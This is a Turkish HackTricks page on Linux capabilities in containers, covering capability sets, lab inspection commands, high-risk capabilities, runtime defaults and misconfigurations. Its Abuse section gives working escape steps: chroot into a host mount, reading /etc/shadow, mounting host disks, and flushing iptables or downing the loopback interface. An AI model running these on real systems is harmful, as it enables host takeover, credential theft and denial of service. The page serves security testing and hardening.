# Container'larda Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

Linux capabilities, container security'ın en önemli parçalarından biridir; çünkü incelikli ama temel bir soruyu yanıtlar: **bir container içinde "root" gerçekten ne anlama gelir?** Normal bir Linux sisteminde UID 0, tarihsel olarak çok geniş bir ayrıcalık kümesi anlamına gelirdi. Modern kernel'larda bu ayrıcalık, capabilities adı verilen daha küçük birimlere ayrılmıştır. İlgili capabilities kaldırılmışsa bir process root olarak çalışabilir ve yine de birçok güçlü işlemi gerçekleştiremeyebilir.

Containers bu ayrımdan büyük ölçüde yararlanır. Uyumluluk veya basitlik nedenleriyle birçok workload hâlâ container içinde UID 0 olarak başlatılır. Capability dropping yapılmadığında bu son derece tehlikeli olurdu. Capability dropping ile container içindeki bir root process, birçok sıradan container içi görevi gerçekleştirmeye devam ederken daha hassas kernel işlemlerinden mahrum bırakılabilir. Bu nedenle `uid=0(root)` gösteren bir container shell'i otomatik olarak "host root" veya "geniş kernel ayrıcalığı" anlamına gelmez. Capability set'leri, bu root kimliğinin gerçekte ne kadar değerli olduğunu belirler.

Linux capability referansının tamamı ve birçok abuse örneği için bkz.:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## İşleyiş

Capabilities; permitted, effective, inheritable, ambient ve bounding set'leri dahil olmak üzere çeşitli set'lerde takip edilir. Birçok container assessment'ı için her set'in kesin kernel semantics'i, şu pratik sorudan daha az önemlidir: **bu process şu anda hangi ayrıcalıklı işlemleri başarıyla gerçekleştirebilir ve gelecekte ayrıcalık kazanımı için hangi yollar hâlâ mümkündür?**

Bunun önemli olmasının nedeni, birçok breakout tekniğinin aslında container sorunları kılığına girmiş capability sorunları olmasıdır. `CAP_SYS_ADMIN` değerine sahip bir workload, normal bir container root process'inin dokunmaması gereken çok büyük miktarda kernel functionality'ye erişebilir. `CAP_NET_ADMIN` değerine sahip bir workload, host network namespace'ini de paylaşıyorsa çok daha tehlikeli hâle gelir. `CAP_SYS_PTRACE` değerine sahip bir workload, host PID sharing üzerinden host process'lerini görebiliyorsa çok daha ilgi çekici olur. Docker veya Podman'da bu durum `--pid=host` olarak görünebilir; Kubernetes'te ise genellikle `hostPID: true` olarak görünür.

Başka bir deyişle capability set, tek başına değerlendirilemez. Namespaces, seccomp ve MAC policy ile birlikte okunmalıdır.

## Lab

Bir container içindeki capabilities'leri incelemenin oldukça doğrudan bir yolu şudur:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Daha kısıtlayıcı bir container'ı tüm capabilities'lerin eklendiği bir container ile de karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Dar bir eklemenin etkisini görmek için her şeyi kaldırıp yalnızca tek bir capability eklemeyi deneyin:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Bu küçük deneyler, bir runtime’ın yalnızca "privileged" adlı bir boolean’ı açıp kapatmadığını göstermeye yardımcı olur. Runtime, process için kullanılabilir gerçek privilege surface’i şekillendirir.

## High-Risk Capabilities

Birçok capability hedefe bağlı olarak önemli olabilse de container escape analizinde birkaç tanesi tekrar tekrar öne çıkar.

**`CAP_SYS_ADMIN`**, defenders’ın en fazla şüpheyle yaklaşması gereken capability’dir. Çok büyük miktarda işlevselliğin kilidini açtığı için genellikle "the new root" olarak tanımlanır. Buna mount ile ilgili işlemler, namespace’e duyarlı davranışlar ve container’lara dikkatsizce açılmaması gereken birçok kernel path’i dahildir. Bir container’da `CAP_SYS_ADMIN`, zayıf seccomp ve güçlü bir MAC confinement yoksa, birçok klasik breakout path’i çok daha gerçekçi hâle gelir.

**`CAP_SYS_PTRACE`**, özellikle process visibility mevcut olduğunda önemlidir; bu durum PID namespace host veya ilgi çekici komşu workload’lar ile paylaşılıyorsa daha da kritiktir. Visibility’yi tampering yeteneğine dönüştürebilir.

**`CAP_NET_ADMIN`** ve **`CAP_NET_RAW`**, network odaklı ortamlarda önem taşır. Isolated bridge network üzerinde zaten riskli olabilirler; shared host network namespace üzerinde ise çok daha kötüdürler, çünkü workload host networking’i yeniden yapılandırabilir, sniffing ve spoofing yapabilir veya local traffic flow’larına müdahale edebilir.

**`CAP_SYS_MODULE`**, rootful bir ortamda genellikle catastrophic’tir; kernel module’larını yüklemek fiilen host-kernel control anlamına gelir. Genel amaçlı bir container workload’unda neredeyse hiçbir zaman bulunmamalıdır.

## Runtime Usage

Docker, Podman, containerd-based stack’ler ve CRI-O capability controls kullanır; ancak default’lar ve management interface’leri farklıdır. Docker bunları `--cap-drop` ve `--cap-add` gibi flag’ler üzerinden doğrudan sunar. Podman benzer controls sunar ve ek bir safety layer olarak rootless execution’dan sıklıkla faydalanır. Kubernetes, capability addition ve removal işlemlerini Pod veya container `securityContext` üzerinden sunar. LXC/Incus gibi system-container ortamları da capability control’e dayanır; ancak bu sistemlerin daha geniş host integration yapısı, operatörleri app-container ortamında yapacaklarından daha agresif biçimde default’ları gevşetmeye teşvik eder.

Aynı principle bunların tamamı için geçerlidir: Teknik olarak grant edilebilen bir capability, mutlaka grant edilmesi gereken bir capability değildir. Gerçek dünyadaki birçok incident, workload daha strict bir configuration altında çalışmadığında ve ekibin hızlı bir fix’e ihtiyaç duyduğunda, operatörün yalnızca bir capability eklemesiyle başlar.

## Misconfigurations

En bariz hata, Docker/Podman-style CLI’larda **`--cap-add=ALL`** kullanmaktır; ancak tek hata bu değildir. Pratikte daha yaygın bir problem, özellikle `CAP_SYS_ADMIN` olmak üzere bir veya iki son derece güçlü capability’nin, namespace, seccomp ve mount implications anlaşılmadan "make the application work" amacıyla grant edilmesidir. Bir diğer yaygın failure mode, extra capability’lerin host namespace sharing ile birleştirilmesidir. Docker veya Podman’da bu, `--pid=host`, `--network=host` veya `--userns=host` olarak görülebilir; Kubernetes’te eşdeğer exposure genellikle `hostPID: true` veya `hostNetwork: true` gibi workload setting’leri üzerinden ortaya çıkar. Bu kombinasyonların her biri, capability’nin gerçekte neleri etkileyebileceğini değiştirir.

Administrator’ların bir workload tamamen `--privileged` olmadığı için hâlâ anlamlı biçimde kısıtlandığına inandığını görmek de yaygındır. Bazen bu doğrudur; ancak bazen effective posture zaten privileged’a yeterince yakındır ve bu ayrım operational olarak önemini kaybeder.

## Abuse

İlk practical step, effective capability set’ini enumerate etmek ve ardından escape veya host information access açısından önem taşıyacak capability-specific action’ları hemen test etmektir:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
`CAP_SYS_ADMIN` mevcutsa, en yaygın breakout kolaylaştırıcılarından biri olduğu için önce mount tabanlı abuse ve host filesystem erişimini test edin:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
`CAP_SYS_PTRACE` mevcutsa ve container ilginç process'leri görebiliyorsa, capability'nin process inspection'a dönüştürülüp dönüştürülemeyeceğini doğrulayın:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
`CAP_NET_ADMIN` veya `CAP_NET_RAW` mevcutsa, workload'un görünür ağ yığınını manipüle edip edemediğini veya en azından faydalı ağ istihbaratı toplayıp toplayamadığını test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Bir capability testi başarılı olduğunda, bunu namespace durumuyla birlikte değerlendirin. İzole bir namespace'te yalnızca riskli görünen bir capability, container aynı zamanda host PID, host network veya host mounts paylaştığında hemen bir escape ya da host-recon primitive hâline gelebilir.

### Tam Örnek: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Container'da `CAP_SYS_ADMIN` ve `/host` gibi host dosya sistemine ait yazılabilir bir bind mount varsa, escape yolu çoğu zaman oldukça basittir:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
`chroot` başarılı olursa, komutlar artık host root filesystem bağlamında çalıştırılır:
```bash
id
hostname
cat /etc/shadow | head
```
`chroot` kullanılamıyorsa, aynı sonuç çoğu zaman binary'yi mount edilmiş tree üzerinden çağırarak elde edilebilir:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Tam Örnek: `CAP_SYS_ADMIN` + Cihaz Erişimi

Ana makineden bir blok cihazı açığa çıkarılırsa `CAP_SYS_ADMIN`, bunu ana makinenin dosya sistemine doğrudan erişime dönüştürebilir:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Tam Örnek: `CAP_NET_ADMIN` + Host Networking

Bu kombinasyon her zaman doğrudan host root sağlamaz, ancak host network stack'ini tamamen yeniden yapılandırabilir:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Bu, denial of service gerçekleştirilmesine, trafiğin interception edilmesine veya daha önce filtrelenen servislere erişim sağlanmasına olanak tanıyabilir.

## Kontroller

Capability kontrollerinin amacı yalnızca ham değerleri dökmek değil, sürecin mevcut namespace ve mount durumunu tehlikeli hâle getirecek kadar ayrıcalığa sahip olup olmadığını anlamaktır.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Burada ilginç olanlar:

- `capsh --print`, `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` veya `cap_sys_module` gibi yüksek riskli capabilities'leri tespit etmenin en kolay yoludur.
- `/proc/self/status` içindeki `CapEff` satırı, yalnızca diğer setlerde mevcut olabilecekleri değil, şu anda gerçekten etkin olanları gösterir.
- Container aynı zamanda host PID, network veya user namespaces'lerini paylaşıyorsa ya da yazılabilir host mount'larına sahipse, capability dökümü çok daha önemli hâle gelir.

Ham capability bilgilerini topladıktan sonraki adım yorumlamadır. Process'in root olup olmadığını, user namespaces'lerin etkin olup olmadığını, host namespaces'lerin paylaşılıp paylaşılmadığını, seccomp'un enforcing durumda olup olmadığını ve AppArmor veya SELinux'un process'i hâlâ kısıtlayıp kısıtlamadığını sorgulayın. Bir capability seti tek başına hikâyenin yalnızca bir parçasıdır; ancak çoğu zaman bir container breakout'un neden çalıştığını, aynı görünen başlangıç noktasıyla başka birinin neden başarısız olduğunu açıklayan kısımdır.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak azaltılmış capability seti | Docker, varsayılan bir allowlist of capabilities tutar ve geri kalanları düşürür | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Varsayılan olarak azaltılmış capability seti | Podman containers varsayılan olarak unprivileged'dır ve azaltılmış bir capability modeli kullanır | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Değiştirilmediği sürece runtime varsayılanlarını devralır | `securityContext.capabilities` belirtilmezse container, runtime'dan varsayılan capability setini alır | `securityContext.capabilities.add`, `drop: [\"ALL\"]` işleminin yapılmaması, `privileged: true` |
| Kubernetes altında containerd / CRI-O | Genellikle runtime varsayılanı | Etkin set, runtime'a ve Pod spec'ine bağlıdır | Kubernetes satırındakiyle aynı; doğrudan OCI/CRI configuration da capabilities'leri açıkça ekleyebilir |

Kubernetes için önemli nokta, API'nin tek bir evrensel varsayılan capability seti tanımlamamasıdır. Pod capabilities eklemez veya düşürmezse workload, o node için runtime'ın varsayılanını devralır.
{{#include ../../../../banners/hacktricks-training.md}}
